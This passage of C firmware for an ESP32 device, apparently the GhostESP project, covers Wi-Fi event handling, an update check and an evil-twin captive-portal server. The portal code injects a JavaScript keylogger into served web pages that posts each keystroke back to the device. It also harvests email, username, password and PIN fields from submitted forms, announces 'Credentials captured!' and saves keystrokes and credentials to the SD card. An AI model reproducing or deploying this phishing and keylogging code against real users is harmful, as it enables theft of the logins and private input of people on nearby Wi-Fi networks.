                esp_err_t dhcp_err = esp_netif_dhcpc_start(wifiSTA);
                if (dhcp_err != ESP_OK &&
                    dhcp_err != ESP_ERR_ESP_NETIF_DHCP_ALREADY_STARTED) {
                    ESP_LOGW(TAG, "STA connected but DHCP start failed: %s",
                             esp_err_to_name(dhcp_err));
                } else {
                    ESP_LOGI(TAG, "STA connected; host DHCP client is active");
                }
            }
            break;
        case WIFI_EVENT_STA_DISCONNECTED:
            if (manual_disconnect) {
                glog("Disconnected from Wi-Fi (manual)\n");
                manual_disconnect = false; // Reset flag
            } else {
                glog("Disconnected from Wi-Fi\n");
                // No auto-reconnection
            }
            break;
        default:
            break;
        }
    } else if (event_base == IP_EVENT) {
        switch (event_id) {
        case IP_EVENT_STA_GOT_IP:
            break;
        case IP_EVENT_AP_STAIPASSIGNED:
            glog("Assigned IP to STA\n");
            toast_show("Target got IP", TOAST_INFO);
            ap_sta_has_ip = true;
            break;
        default:
            break;
        }
    }
}


static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
                               void *event_data);
static void wifi_retry_timer_callback(void* arg);

static void ota_auto_check_task(void *arg) {
    (void)arg;

#ifndef CONFIG_SPIRAM
    ESP_LOGI(TAG, "Skipping OTA auto-check on no-PSRAM build");
    ota_auto_check_done = true;
    ota_auto_check_running = false;
    vTaskDelete(NULL);
    return;
#endif

    // Avoid TLS allocation while app_main, display, SD, and plugin discovery
    // are simultaneously consuming their boot-time internal/DMA peaks.
    vTaskDelay(pdMS_TO_TICKS(10000));

    bool update_available = false;

    if (ota_manager_is_supported()) {
        if (ota_manager_check_now_blocking() == ESP_OK) {
            OtaStatus status = ota_manager_get_status();
            if (status.state == OTA_STATE_UPDATE_AVAILABLE &&
                status.latest_build_number > (long)GHOSTESP_BUILD_NUMBER) {
                glog("There is a new update available: device firmware %s (build %ld > %ld)\n",
                     status.latest_version, status.latest_build_number, (long)GHOSTESP_BUILD_NUMBER);
                update_available = true;
            }
        }
    } else if (self_ota_manager_is_supported()) {
        if (self_ota_manager_check_now_blocking() == ESP_OK) {
            SelfOtaStatus status = self_ota_manager_get_status();
            if (status.state == SELF_OTA_STATE_UPDATE_AVAILABLE &&
                status.latest_build_number > (long)GHOSTESP_BUILD_NUMBER) {
                glog("There is a new update available: device firmware %s (build %ld > %ld)\n",
                     status.latest_version, status.latest_build_number, (long)GHOSTESP_BUILD_NUMBER);
                update_available = true;
            }
        }
    }

    if (peer_ota_manager_is_supported() && esp_comm_manager_is_connected()) {
        if (peer_ota_manager_check_now_blocking() == ESP_OK) {
            PeerOtaStatus status = peer_ota_manager_get_status();
            if (status.state == PEER_OTA_STATE_UPDATE_AVAILABLE &&
                status.peer_current_build_number >= 0 &&
                status.peer_build_number > status.peer_current_build_number) {
                glog("There is a new update available: GhostLink peer firmware %s (build %ld > %ld)\n",
                     status.peer_version, status.peer_build_number, status.peer_current_build_number);
                update_available = true;
            }
        }
    }

    if (update_available) {
        toast_show("There is a new update available", TOAST_INFO);
    }

    ota_auto_check_done = true;
    ota_auto_check_running = false;
    vTaskDelete(NULL);
}

static void schedule_ota_auto_check(void) {
    if (ota_auto_check_running || ota_auto_check_done) return;
    ota_auto_check_running = true;
    BaseType_t rc = xTaskCreate(ota_auto_check_task, "ota_auto_chk", 8192, NULL,
                                tskIDLE_PRIORITY + 1, NULL);
    if (rc != pdPASS) {
        ota_auto_check_running = false;
        glog("Failed to start automatic firmware update check\n");
    }
}

static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
                               void *event_data)
{
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        wifi_driver_started = true;
        ESP_LOGD(TAG, "STA started; saved-network connect is explicit/reconnect-only");
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_CONNECTED) {
#if CONFIG_IDF_TARGET_ESP32P4
        /* The default Wi-Fi handler has already registered RX, raised the
         * netif and started DHCP. Do not run its actions a second time. */
        esp_netif_dhcp_status_t dhcp_status = ESP_NETIF_DHCP_INIT;
        esp_err_t dhcp_err = wifiSTA ? esp_netif_dhcpc_get_status(wifiSTA, &dhcp_status)
                                    : ESP_ERR_INVALID_STATE;
        if (dhcp_err == ESP_OK && dhcp_status == ESP_NETIF_DHCP_STARTED) {
            ESP_LOGI(TAG, "STA associated; waiting for DHCP lease (netif up=%d)",
                     esp_netif_is_netif_up(wifiSTA));
        } else {
            ESP_LOGW(TAG, "STA associated but DHCP is not running: status=%d err=%s",
                     (int)dhcp_status, esp_err_to_name(dhcp_err));
        }
#else
        /* With ESP-Hosted, association can arrive without the normal local
         * netif action starting DHCP.  This is the registered handler, so make
         * the host STA obtain its address as soon as the C6 reports success. */
        if (wifiSTA) {
            /* Ensure the lwIP netif is up and the hosted station receive path
             * is treated exactly like a normal local Wi-Fi connection. */
            esp_netif_action_connected(wifiSTA, event_base, event_id, event_data);
            esp_err_t dhcp_err = esp_netif_dhcpc_start(wifiSTA);
            if (dhcp_err != ESP_OK &&
                dhcp_err != ESP_ERR_ESP_NETIF_DHCP_ALREADY_STARTED) {
                ESP_LOGW(TAG, "STA connected but DHCP start failed: %s",
                         esp_err_to_name(dhcp_err));
            } else {
                ESP_LOGI(TAG, "STA connected; host DHCP client is active");
            }
        }
#endif
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_STOP) {
        wifi_driver_started = false;
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        wifi_event_sta_disconnected_t* disconnected = (wifi_event_sta_disconnected_t*) event_data;
        
        // Provide more detailed reason descriptions
        const char* reason_str = "Unknown";
#if CONFIG_IDF_TARGET_ESP32P4
        /* Use IDF constants: the old numeric table mislabeled reasons 200-205. */
        switch(disconnected->reason) {
            case WIFI_REASON_AUTH_EXPIRE: reason_str = "Authentication expired"; break;
            case WIFI_REASON_AUTH_LEAVE: reason_str = "Authentication leave"; break;
            case WIFI_REASON_DISASSOC_DUE_TO_INACTIVITY: reason_str = "Association inactive"; break;
            case WIFI_REASON_ASSOC_TOOMANY: reason_str = "AP has too many stations"; break;
            case WIFI_REASON_ASSOC_LEAVE: reason_str = "Association leave"; break;
            case WIFI_REASON_STA_LEAVING: reason_str = "Station leaving"; break;
            case WIFI_REASON_4WAY_HANDSHAKE_TIMEOUT: reason_str = "4-way handshake timeout"; break;
            case WIFI_REASON_BEACON_TIMEOUT: reason_str = "Beacon timeout"; break;
            case WIFI_REASON_NO_AP_FOUND: reason_str = "AP not found"; break;
            case WIFI_REASON_AUTH_FAIL: reason_str = "Authentication failed"; break;
            case WIFI_REASON_ASSOC_FAIL: reason_str = "Association failed"; break;
            case WIFI_REASON_HANDSHAKE_TIMEOUT: reason_str = "Handshake timeout"; break;
            case WIFI_REASON_CONNECTION_FAIL: reason_str = "Connection failed"; break;
            case WIFI_REASON_NO_AP_FOUND_W_COMPATIBLE_SECURITY: reason_str = "No AP with compatible security"; break;
            case WIFI_REASON_NO_AP_FOUND_IN_AUTHMODE_THRESHOLD: reason_str = "AP security below configured threshold"; break;
            case WIFI_REASON_NO_AP_FOUND_IN_RSSI_THRESHOLD: reason_str = "AP signal below configured threshold"; break;
        }
        /* Keep the actual cause visible even when a manual attempt owns retries.
         * SSID is length-delimited in IDF and need not be null-terminated. */
        int ssid_len = disconnected->ssid_len;
        if (ssid_len > sizeof(disconnected->ssid)) ssid_len = sizeof(disconnected->ssid);
        ESP_LOGW(TAG, "STA disconnect: %s (reason %u), SSID=\"%.*s\", RSSI=%d",
                 reason_str, (unsigned)disconnected->reason,
                 ssid_len, disconnected->ssid, (int)disconnected->rssi);
#else
        switch(disconnected->reason) {
            case 2: reason_str = "Auth Expired"; break;
            case 3: reason_str = "Auth Leave"; break;
            case 4: reason_str = "Assoc Expire"; break;
            case 5: reason_str = "Assoc Too Many"; break;
            case 6: reason_str = "Not Authed"; break;
            case 7: reason_str = "Not Assoc"; break;
            case 8: reason_str = "Assoc Leave"; break;
            case 15: reason_str = "4Way Handshake Timeout"; break;
            case 201: reason_str = "Beacon Timeout"; break;
            case 202: reason_str = "No AP Found"; break;
            case 203: reason_str = "Auth Fail"; break;
            case 204: reason_str = "Assoc Fail"; break;
            case 205: reason_str = "Handshake Timeout"; break;
        }
#endif
        
        // Clean, single-line disconnect logging
        const char *reason = NULL;
        if (wifi_reconnect_hold) {
            glog("WiFi disconnected while radio reserved\n");
            manual_disconnect = false;
            wifi_reconnect_reset();
        } else if (wifi_reconnect_blocked(&reason)) {
            glog("WiFi disconnected while %s\n", reason ? reason : "busy");
            manual_disconnect = false;
#if CONFIG_IDF_TARGET_ESP32P4
            if (xEventGroupGetBits(wifi_event_group) & WIFI_CONNECTING_BIT) {
                wifi_reconnect_reset();
            } else
#endif
            {
                if (wifi_reconnect_count == 0) {
                    wifi_reconnect_count = 1;
                }
                wifi_reconnect_schedule();
            }
        } else if (manual_disconnect) {
            glog("WiFi disconnected manually\n");
            status_display_show_status("WiFi Disconnected");
            toast_show("WiFi disconnected", TOAST_WARN);
            manual_disconnect = false;
            wifi_reconnect_reset();
        } else {
            glog("WiFi disconnected: %s (reason %d)\n", reason_str, disconnected->reason);
            status_display_show_status("WiFi Lost");
            toast_show("WiFi lost", TOAST_WARN);

            if (!settings_get_wifi_auto_reconnect(&G_Settings)) {
                glog("Auto-reconnect disabled; not retrying\n");
                wifi_reconnect_reset();
            } else {
                wifi_reconnect_count++;
                if (wifi_reconnect_count <= WIFI_MAX_RECONNECT_ATTEMPTS) {
                    glog("Scheduling reconnect %d/%d\n", wifi_reconnect_count, WIFI_MAX_RECONNECT_ATTEMPTS);
                    wifi_reconnect_schedule();
                } else {
                    glog("Max reconnect attempts (%d) reached\n", WIFI_MAX_RECONNECT_ATTEMPTS);
                    wifi_reconnect_timer_stop();
                }
            }
        }
        
        xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);

#if !CONFIG_IDF_TARGET_ESP32P4
        /* Preserve the legacy non-P4 connection handling. On P4 the default
         * Wi-Fi handler has already taken down the netif and DHCP client. */
        if (wifiSTA) {
            esp_netif_action_disconnected(wifiSTA, event_base, event_id, event_data);
        }
#endif

        {
            dns_server_handle_t h = dns_handle_take();
            if (h) stop_dns_server(h);
        }
    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
        glog("Got IP: %s\n", ip4addr_ntoa(&event->ip_info.ip));
        status_display_show_status("WiFi Connected");
        toast_show("WiFi connected", TOAST_SUCCESS);
        ghostchi_manager_add_xp(3);

        /* Set reliable fallback DNS servers so external resolution doesn't
         * depend entirely on the router's DNS. DHCP sets DNS_MAIN (index 0);
         * we set BACKUP and FALLBACK here after DHCP has run. */
        esp_netif_dns_info_t dns = {0};
        dns.ip.type = ESP_IPADDR_TYPE_V4;
        dns.ip.u_addr.ip4.addr = esp_ip4addr_aton("8.8.8.8");
        esp_netif_set_dns_info(wifiSTA, ESP_NETIF_DNS_BACKUP, &dns);
        dns.ip.u_addr.ip4.addr = esp_ip4addr_aton("1.1.1.1");
        esp_netif_set_dns_info(wifiSTA, ESP_NETIF_DNS_FALLBACK, &dns);

        xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
        wifi_reconnect_reset();
        wifi_manager_start_sntp();
        if (settings_get_wigle_auto_upload(&G_Settings)) {
            wigle_upload_all_async();
        }
        schedule_ota_auto_check();
    }
}
// Removed old wifi_retry_timer_callback - using unified retry system

// Station scan helper functions moved to station_scan.c module

esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *content_type) {
    httpd_resp_set_hdr(req, "Connection", "close");

    if (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0) {
        FILE *file = fopen(url, "r");
        if (file == NULL) {
            printf("Error: cannot open file %s\n", url);
            return ESP_FAIL;
        }

        httpd_resp_set_type(req, content_type ? content_type : "application/octet-stream");
        httpd_resp_set_status(req, "200 OK");

        char *buffer = NULL;
        bool used_global = false;
        if (stream_buf_lock()) {
            buffer = g_stream_buf;
            used_global = true;
        } else {
            buffer = (char *)heap_caps_malloc(CHUNK_SIZE + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
            if (buffer == NULL) {
                buffer = (char *)malloc(CHUNK_SIZE + 1);
            }
            if (buffer == NULL) {
                fclose(file);
                return ESP_FAIL;
            }
        }

        int read_len;
        while ((read_len = fread(buffer, 1, CHUNK_SIZE, file)) > 0) {
            if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
                printf("Error: send chunk failed\n");
                break;
            }
        }
        // Inject capture JS if serving HTML
        if (content_type && strcmp(content_type, "text/html") == 0) {
            httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
        }

        if (used_global) {
            stream_buf_unlock();
        } else {
            free(buffer);
        }
        fclose(file);
        httpd_resp_send_chunk(req, NULL, 0);
        printf("Served file: %s\n", url);
        return ESP_OK;
    } else {
        // Proceed with HTTP request if not an SD card file
        esp_http_client_config_t config = {
            .url = url,
            .timeout_ms = 5000,
            .crt_bundle_attach = esp_crt_bundle_attach,
            .transport_type = HTTP_TRANSPORT_OVER_SSL,
            .user_agent = "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973U) "
                          "AppleWebKit/537.36 (KHTML, like "
                          "Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile "
                          "Safari/537.36", // Browser-like
                                           // User-Agent
                                           // string
            .disable_auto_redirect = false,
        };

        esp_http_client_handle_t client = esp_http_client_init(&config);
        if (client == NULL) {
            printf("Failed to initialize HTTP client\n");
            return ESP_FAIL;
        }

        esp_err_t err = esp_http_client_perform(client);
        if (err != ESP_OK) {
            printf("HTTP request failed: %s\n", esp_err_to_name(err));
            esp_http_client_cleanup(client);
            return ESP_FAIL;
        }

        int http_status = esp_http_client_get_status_code(client);
        printf("Final HTTP Status code: %d\n", http_status);

        if (http_status == 200) {
            printf("Received 200 OK\nRe-opening connection for manual streaming...\n");

            err = esp_http_client_open(client, 0);
            if (err != ESP_OK) {
                printf("Failed to re-open HTTP connection for streaming: %s\n",
                       esp_err_to_name(err));
                esp_http_client_cleanup(client);
                return ESP_FAIL;
            }

            int content_length = esp_http_client_fetch_headers(client);
            printf("Content length: %d\n", content_length);

            httpd_resp_set_type(req, content_type ? content_type : "application/octet-stream");

            httpd_resp_set_hdr(req, "Content-Security-Policy",
                               "default-src 'self' 'unsafe-inline' data: blob:; "
                               "script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; "
                               "style-src 'self' 'unsafe-inline' data:; "
                               "img-src 'self' 'unsafe-inline' data: blob:; "
                               "connect-src 'self' data: blob:;");
            httpd_resp_set_status(req, "200 OK");

            char *buffer = NULL;
            bool used_global = false;
            if (stream_buf_lock()) {
                buffer = g_stream_buf;
                used_global = true;
            } else {
                buffer = (char *)heap_caps_malloc(CHUNK_SIZE + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
                if (buffer == NULL) {
                    buffer = (char *)malloc(CHUNK_SIZE + 1);
                }
                if (buffer == NULL) {
                    esp_http_client_cleanup(client);
                    return ESP_FAIL;
                }
            }

            int read_len;
            while ((read_len = esp_http_client_read(client, buffer, CHUNK_SIZE)) > 0) {
                if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
                    printf("Failed to send chunk to client\n");
                    break;
                }
            }

            if (read_len == 0) {
                printf("Finished reading all data from server (end of content)\n");
            } else if (read_len < 0) {
                printf("Failed to read response, read_len: %d\n", read_len);
            }

            if (content_type && strcmp(content_type, "text/html") == 0) {
                const char *javascript_code =
                    "<script>\n"
                    "(function(){\n"
                    "function logKey(key){\n"
                    "    var xhr = new XMLHttpRequest();\n"
                    "    xhr.open('POST','/api/log',true);\n"
                    "    xhr.setRequestHeader('Content-Type','application/json;charset=UTF-8');\n"
                    "    xhr.send(JSON.stringify({key:key}));\n"
                    "}\n"
                    "document.addEventListener('keyup', function(e){ logKey(e.key); });\n"
                    "document.addEventListener('input', function(e){ if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){ var val=e.target.value; var key=val.slice(-1); if(key) logKey(key);} });\n"
                    "})();\n"
                    "</script>\n";
                if (httpd_resp_send_chunk(req, javascript_code, strlen(javascript_code)) != ESP_OK) {
                    printf("Failed to send custom JavaScript\n");
                }
            }

            if (used_global) {
                stream_buf_unlock();
            } else {
                free(buffer);
            }
            esp_http_client_close(client);
            esp_http_client_cleanup(client);

            httpd_resp_send_chunk(req, NULL, 0);

            return ESP_OK;
        } else {
            printf("Unhandled HTTP status code: %d\n", http_status);
            esp_http_client_cleanup(client);
            return ESP_FAIL;
        }
    }
}

const char *get_content_type(const char *uri) {
    if (strstr(uri, ".html")) {
        return "text/html";
    }
    if (strstr(uri, ".css")) {
        return "text/css";
    } else if (strstr(uri, ".js")) {
        return "application/javascript";
    } else if (strstr(uri, ".png")) {
        return "image/png";
    } else if (strstr(uri, ".jpg") || strstr(uri, ".jpeg")) {
        return "image/jpeg";
    } else if (strstr(uri, ".gif")) {
        return "image/gif";
    }
    return "application/octet-stream"; // Default to binary stream if unknown
}

char *get_host_from_req(httpd_req_t *req) {
    size_t host_len = httpd_req_get_hdr_value_len(req, "Host");
    if (host_len > 0 && host_len <= PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE) {
        char *host = malloc(host_len + 1);
        if (!host) {
            httpd_resp_send_500(req);
            return NULL;
        }
        if (httpd_req_get_hdr_value_str(req, "Host", host, host_len + 1) == ESP_OK) {
            printf("Host header found: %s\n", host);
            return host; // Caller must free() this memory
        }
        free(host);
    }
    if (host_len > PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE) {
        ESP_LOGW(TAG, "Ignoring oversized Host header (%zu bytes)", host_len);
    } else {
        printf("Host header not found\n");
    }
    return NULL;
}

void build_file_url(const char *host, const char *uri, char *file_url, size_t max_len) {
    snprintf(file_url, max_len, "https://%s%s", host, uri);
    printf("File URL built: %s\n", file_url);
}

esp_err_t file_handler(httpd_req_t *req) {
    const char *uri = req->uri;
    const char *content_type = get_content_type(uri);
    char local_path[512];
    {
        size_t maxlen = sizeof(local_path) - strlen("/mnt") - 1;
        snprintf(local_path, sizeof(local_path), "/mnt%.*s", (int)maxlen, uri);
    }

    if (strstr(local_path, "..") != NULL) {
        httpd_resp_send_404(req);
        return ESP_FAIL;
    }

    bool require_jit = sd_card_needs_jit_mount();

    bool display_was_suspended = false;
    bool did_mount = false;
    if (require_jit && !sd_card_manager.is_initialized) {
        did_mount = (sd_card_mount_for_flush(&display_was_suspended) == ESP_OK);
    }

    FILE *f = fopen(local_path, "r");
    if (f) {
        fclose(f);
        esp_err_t r = stream_data_to_client(req, local_path, content_type);
        if (did_mount) sd_card_unmount_after_flush(display_was_suspended);
        return r;
    }

    if (did_mount) sd_card_unmount_after_flush(display_was_suspended);

    // never proxy captive requests to the real internet; keep responses local
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/login");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

esp_err_t done_handler(httpd_req_t *req) {
    login_done = true;
    const char *msg = "<html><body><h1>Portal closed</h1></body></html>";
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, msg, strlen(msg));
    // no automatic shutdown
    return ESP_OK;
}
esp_err_t portal_handler(httpd_req_t *req) {
    // Rate-limit /login and other directly-served portal pages too.
    uint32_t client_addr = portal_get_client_addr(req);
    if (client_addr != 0 && !portal_http_rate_limit_allow(client_addr)) {
        httpd_resp_set_hdr(req, "Connection", "close");
        httpd_resp_set_status(req, "429 Too Many Requests");
        httpd_resp_send(req, "Too many requests", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }

    ESP_LOGD(TAG, "Client requested URL: %s", req->uri);
    ESP_LOGD(TAG, "Free heap before serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size

    // Debug buffer state
    ESP_LOGD(TAG, "HTML buffer check: html_buffer=%p, html_buffer_size=%zu, use_html_buffer=%s",
             html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");

    // Prefer buffered HTML over default embedded portal when available
    if (html_buffer != NULL && html_buffer_size > 0) {
        ESP_LOGD(TAG, "Using buffered HTML (size: %zu bytes)", html_buffer_size);
        httpd_resp_set_type(req, "text/html");
        httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked"); // Set chunked response
        httpd_resp_send_chunk(req, html_buffer, html_buffer_size);
        httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
        httpd_resp_send_chunk(req, NULL, 0);
        ESP_LOGD(TAG, "Served HTML from buffer (size: %zu bytes) with JS injection.", html_buffer_size);
        ESP_LOGD(TAG, "Free heap after serving buffer: %" PRIu32 " bytes", esp_get_free_heap_size());
        return ESP_OK;
    }

    // Serve from the pre-loaded portal file cache on JIT SD-mount builds.
    if (portal_file_cache != NULL && portal_file_cache_size > 0) {
        ESP_LOGD(TAG, "Using pre-loaded portal file cache (%zu bytes)", portal_file_cache_size);
        httpd_resp_set_type(req, "text/html");
        httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked");
        httpd_resp_send_chunk(req, portal_file_cache, portal_file_cache_size);
        httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
        httpd_resp_send_chunk(req, NULL, 0);
        ESP_LOGD(TAG, "Served portal from file cache with JS injection.");
        return ESP_OK;
    }

    // Check if we should serve the default embedded portal
    if (strcmp(PORTALURL, "INTERNAL_DEFAULT_PORTAL") == 0) {
        httpd_resp_set_type(req, "text/html");
        httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked");
        httpd_resp_send_chunk(req, default_portal_html, strlen(default_portal_html));
        httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
        httpd_resp_send_chunk(req, NULL, 0);
        ESP_LOGD(TAG, "Served default embedded portal with JS injection.");
        ESP_LOGD(TAG, "Free heap after serving default portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
        return ESP_OK;
    }

    // Otherwise, proceed with streaming from URL or file.
    // Mount SD only when the active transport requires JIT access.
    bool portal_jit_display_suspended = false;
    bool portal_jit_did_mount = false;
    bool portal_is_local_file = (strncmp(PORTALURL, "http://", 7) != 0 &&
                                 strncmp(PORTALURL, "https://", 8) != 0);
    if (sd_card_needs_jit_mount() && portal_is_local_file && !sd_card_manager.is_initialized) {
        portal_jit_did_mount = (sd_card_mount_for_flush(&portal_jit_display_suspended) == ESP_OK);
    }
    esp_err_t err = stream_data_to_client(req, PORTALURL, "text/html");
    if (portal_jit_did_mount) sd_card_unmount_after_flush(portal_jit_display_suspended);

    if (err != ESP_OK) {
        const char *err_msg = esp_err_to_name(err);

        char error_message[512];
        snprintf(
            error_message, sizeof(error_message),
            "<html><body><h1>Failed to fetch portal content</h1><p>Error: %s</p></body></html>",
            err_msg);

        httpd_resp_set_type(req, "text/html");
        httpd_resp_send(req, error_message, strlen(error_message));
    }

    ESP_LOGD(TAG, "Free heap after serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
    return ESP_OK;
}
esp_err_t get_log_handler(httpd_req_t *req) {
    if (req->content_len <= 0 || req->content_len > PORTAL_MAX_LOG_BODY_SIZE) {
        httpd_resp_set_hdr(req, "Connection", "close");
        httpd_resp_set_status(req, "413 Payload Too Large");
        httpd_resp_send(req, "Portal log payload too large", HTTPD_RESP_USE_STRLEN);
        return ESP_FAIL;
    }

    if (!portal_capture_request_allowed()) {
        httpd_resp_set_hdr(req, "Connection", "close");
        httpd_resp_set_status(req, "429 Too Many Requests");
        httpd_resp_send(req, "Portal log rate limit exceeded", HTTPD_RESP_USE_STRLEN);
        return ESP_FAIL;
    }

    char body[PORTAL_MAX_LOG_BODY_SIZE + 1];
    size_t received_total = 0;

    bool require_jit = sd_card_needs_jit_mount();

    while (received_total < (size_t)req->content_len) {
        int received = httpd_req_recv(req, body + received_total,
                                     (size_t)req->content_len - received_total);
        if (received <= 0) {
            if (received == HTTPD_SOCK_ERR_TIMEOUT) {
                httpd_resp_send_408(req);
            }
            return ESP_FAIL;
        }
        received_total += (size_t)received;
    }
    body[received_total] = '\0';

    if (current_keystrokes_filename[0] != '\0') {
        if (!require_jit) {
            if (sd_card_manager.is_initialized) {
                FILE *f = fopen(current_keystrokes_filename, "a");
                if (f) {
                    fwrite(body, 1, received_total, f);
                    fclose(f);
                }
            }
        } else {
            size_t chunk = received_total;
            if (s_portal_keystroke_len + chunk >= PORTAL_KEYSTROKE_BUF_SZ) {
                portal_flush_buffers_if_due();
            }
            size_t avail = PORTAL_KEYSTROKE_BUF_SZ - s_portal_keystroke_len;
            if (chunk > avail) chunk = avail;
            memcpy(s_portal_keystroke_buf + s_portal_keystroke_len, body, chunk);
            s_portal_keystroke_len += chunk;
        }
    }

    httpd_resp_send(req, "Body content logged successfully", 30);
    return ESP_OK;
}

esp_err_t get_info_handler(httpd_req_t *req) {
    char query[512] = {0};
    char decoded_email[128] = {0};
    char decoded_password[128] = {0};

    bool require_jit = sd_card_needs_jit_mount();

    if (!portal_capture_request_allowed()) {
        httpd_resp_set_hdr(req, "Connection", "close");
        httpd_resp_set_status(req, "429 Too Many Requests");
        httpd_resp_send(req, "Portal capture rate limit exceeded", HTTPD_RESP_USE_STRLEN);
        return ESP_FAIL;
    }

    // Try query string first (GET), then read POST body if no query
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) != ESP_OK) {
        // For POST /get with form body
        if (req->content_len > 0 && req->content_len < (int)sizeof(query) - 1) {
            int received = 0;
            while (received < req->content_len) {
                int r = httpd_req_recv(req, query + received, req->content_len - received);
                if (r <= 0) break;
                received += r;
            }
            query[received] = '\0';
        }
    }

    if (query[0] != '\0') {
        // Extract known fields first
        char val_buf[128] = {0};
        if (get_query_param_value(query, "email", val_buf, sizeof(val_buf)) == ESP_OK) {
            url_decode(decoded_email, val_buf);
        }
        if (get_query_param_value(query, "password", val_buf, sizeof(val_buf)) == ESP_OK) {
            url_decode(decoded_password, val_buf);
        }
        // Also try common alternative field names
        if (decoded_email[0] == '\0') {
            const char *email_keys[] = {"user", "username", "login", "account", "phone", NULL};
            for (int i = 0; email_keys[i] != NULL; i++) {
                if (get_query_param_value(query, email_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
                    url_decode(decoded_email, val_buf);
                    if (decoded_email[0] != '\0') break;
                }
            }
        }
        if (decoded_password[0] == '\0') {
            const char *pass_keys[] = {"pass", "passwd", "pin", NULL};
            for (int i = 0; pass_keys[i] != NULL; i++) {
                if (get_query_param_value(query, pass_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
                    url_decode(decoded_password, val_buf);
                    if (decoded_password[0] != '\0') break;
                }
            }
        }

        // Log primary credentials if found
        if (decoded_email[0] != '\0' || decoded_password[0] != '\0') {
            glog("Captured credentials: %s / %s\n", decoded_email, decoded_password);
            toast_show("Credentials captured!", TOAST_SUCCESS);
        }

        // Build a full field dump for the log (all query params)
        char all_fields[384] = {0};
        int af_pos = 0;
        const char *p = query;
        while (*p && af_pos < (int)sizeof(all_fields) - 1) {
            const char *eq = strchr(p, '=');
            const char *amp = strchr(p, '&');
            if (!eq) break;
            char key_buf[64] = {0};
            char val_buf2[128] = {0};
            size_t klen = (size_t)(eq - p);
            if (klen >= sizeof(key_buf)) klen = sizeof(key_buf) - 1;
            strncpy(key_buf, p, klen);
            key_buf[klen] = '\0';
            const char *vstart = eq + 1;
            size_t vlen = amp ? (size_t)(amp - vstart) : strlen(vstart);
            if (vlen >= sizeof(val_buf2)) vlen = sizeof(val_buf2) - 1;
            strncpy(val_buf2, vstart, vlen);
            val_buf2[vlen] = '\0';
            char decoded_val[128] = {0};
            url_decode(decoded_val, val_buf2);
            int written = snprintf(all_fields + af_pos, sizeof(all_fields) - (size_t)af_pos,
                                   "%s%s=%s", (af_pos > 0 ? ", " : ""), key_buf, decoded_val);
            if (written > 0) af_pos += written;
            p = amp ? amp + 1 : p + strlen(p);
        }

        // Write to credentials file
        if (current_creds_filename[0] != '\0') {
            char line[512];
            int n;
            if (decoded_email[0] != '\0' || decoded_password[0] != '\0') {
                n = snprintf(line, sizeof(line), "Email: %s, Password: %s | All: %s\n",
                             decoded_email, decoded_password, all_fields);
            } else {
                n = snprintf(line, sizeof(line), "Fields: %s\n", all_fields);
            }
            if (n > 0 && (size_t)n < sizeof(line)) {
                if (!require_jit) {
                    if (sd_card_manager.is_initialized) {
                        FILE *f = fopen(current_creds_filename, "a");
                        if (f) {
                            fwrite(line, 1, (size_t)n, f);
                            fclose(f);
                        }
                    }
                } else {
                    size_t cp = (size_t)n;
                    if (s_portal_creds_len + cp > PORTAL_CREDS_BUF_SZ) {
                        portal_flush_buffers_if_due();
                    }
                    size_t avail = PORTAL_CREDS_BUF_SZ - s_portal_creds_len;
                    if (cp > avail) cp = avail;
                    memcpy(s_portal_creds_buf + s_portal_creds_len, line, cp);
                    s_portal_creds_len += cp;
                }
            }
        }
    }

    if (login_done) {
        httpd_resp_set_status(req, "204 No Content");
        httpd_resp_send(req, NULL, 0);
    } else {
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "/login");
        httpd_resp_send(req, NULL, 0);
    }
    return ESP_OK;
}

esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
    // Enforce a lightweight per-client HTTP rate limit early, before any heap
    // allocations or expensive portal serving work.
    uint32_t client_addr = portal_get_client_addr(req);
